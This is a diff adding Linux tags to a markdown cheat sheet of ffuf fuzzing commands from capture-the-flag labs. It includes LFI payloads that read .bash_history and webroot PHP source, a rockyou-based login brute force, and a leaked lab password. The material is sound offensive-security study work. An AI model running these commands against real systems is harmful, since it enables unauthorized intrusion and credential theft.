@@ -5,6 +5,7 @@ Fast web fuzzer written in Go. Used for directory brute-forcing, API endpoint di
 ## Commands Used
 
 ### API endpoint fuzzing (filter 404 + word-count)
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://staging.silentium.htb/api/v1/FUZZ \
   -w /usr/share/seclists/Discovery/Web-Content/api-endpoints-res.txt \
@@ -16,6 +17,7 @@ Used on: **Silentium**
 - `-fw 2` - filter out responses with 2 words
 
 ### Directory fuzzing on root
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://monitorsfour.htb/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
@@ -23,6 +25,7 @@ ffuf -u http://monitorsfour.htb/FUZZ \
 Used on: **MonitorsFour**
 
 ### API path fuzzing
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt
@@ -30,6 +33,7 @@ ffuf -u http://monitorsfour.htb/api/v1/FUZZ \
 Used on: **MonitorsFour**
 
 ### Fuzzing with vhost header and size filter
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
   -H "Host: cacti.monitorsfour.htb" \
@@ -44,6 +48,7 @@ Used on: **MonitorsFour**
 - `-c` - colored output
 
 ### Fuzzing with file extensions
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://cacti.monitorsfour.htb/cacti/FUZZ" \
   -H "Host: cacti.monitorsfour.htb" \
@@ -57,6 +62,7 @@ Used on: **MonitorsFour**
 - `-fw 1,604` - filter responses with 1 or 604 words
 
 ### LFI parameter fuzzing (filter by word count)
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://dev.team.thm/script.php?page=FUZZ" \
   -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
@@ -67,6 +73,7 @@ Used on: **Team**
 `-fw 1,18` - filter out baseline responses with 1 or 18 words
 
 ### Backup file extension brute-force
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://team.thm/scripts/scriptFUZZ" \
   -w <(echo -e ".bak\n.old\n_backup\n.bkp\n~\n.txt\n.sh\n.orig\n.save") \
@@ -77,6 +84,7 @@ Used on: **Team**
 discovered `script.old` containing FTP credentials.
 
 ### Hidden parameter discovery (the payload value forces a different response size)
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://$TARGET:5000/api/v1/resources/books?FUZZ=/home/sid/.bash_history" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \
@@ -90,6 +98,7 @@ found the hidden `show=` parameter that turned into LFI -> Werkzeug PIN -> RCE. 
 - `-fs <baseline>` / `-fw <baseline>` - adjust after one run; `ffuf` prints the size/word histogram so you can pick the dominant baseline to filter.
 
 ### API version-pivot fuzz (find legacy `/v1/` when current `/v2/` is hardened)
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://$TARGET:5000/api/FUZZ/resources/books" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt -fs 200
@@ -99,6 +108,7 @@ Used on: **Bookstore**
 v1 was still wired up and accepted the hidden parameter v2 had blocked.
 
 ### Discover the parameter name on a single endpoint
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://$TARGET/file.php?FUZZ" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -fw 3
@@ -108,6 +118,7 @@ Used on: **Recruit**
 `cv` was the only parameter name that produced a different baseline (3 words = "Missing cv parameter").
 
 ### LFI parameter-value fuzz (file:// URI inside an SSRF-style fetcher)
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://$TARGET/file.php?cv=file:///FUZZ" \
   -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt \
@@ -118,6 +129,7 @@ Used on: **Recruit**
 only paths inside the webroot returned content; everything else hit "Only local files are allowed" (2 words).
 
 ### Webroot `.php` source brute-force
+<!-- cmd: linux -->
 ```bash
 ffuf -u "http://$TARGET/file.php?cv=file:///var/www/html/FUZZ.php" \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-words.txt -fw 2
@@ -127,6 +139,7 @@ Used on: **Recruit**
 `config.php` leaked `$HR_PASSWORD = 'hrpassword123'`. Pair with [php-source-disclosure-lfi.md](../../exploits/web-disclosure/php-source-disclosure-lfi.md).
 
 ### POST login bruteforce (multi-wordlist)
+<!-- cmd: linux -->
 ```bash
 ffuf -w usernames.txt:W1,/usr/share/wordlists/rockyou.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://$TARGET/customers/login -fc 200
 ```
@@ -135,6 +148,7 @@ Used on: **General**
 template for brute-forcing a POST login form with two parameters.
 
 ### Extension fuzzing inside a discovered path
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://10.130.130.11/console/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.bak,.txt,.old
 ```
@@ -143,6 +157,7 @@ Used on: **biteme**
 discovered `dashboard.php`, `config.php`, and `functions.php` inside a hidden console directory.
 
 ### WebDAV directory discovery
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://$TARGET/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
@@ -152,6 +167,7 @@ Used on: **bsidesgtdav**
 found `/webdav`, later abused with default credentials and upload.
 
 ### Extension fuzzing inside a discovered dev path
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://$TARGET:8080/dev/FUZZ \
   -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt \
@@ -162,6 +178,7 @@ Used on: **coldvvars**
 checked for PHP/text/env content below `/dev`.
 
 ### Directory fuzzing against a vhost
+<!-- cmd: linux -->
 ```bash
 ffuf -u http://app.gridmark.io/FUZZ \
   -w /usr/share/seclists/Discovery/Web-Content/common.txt
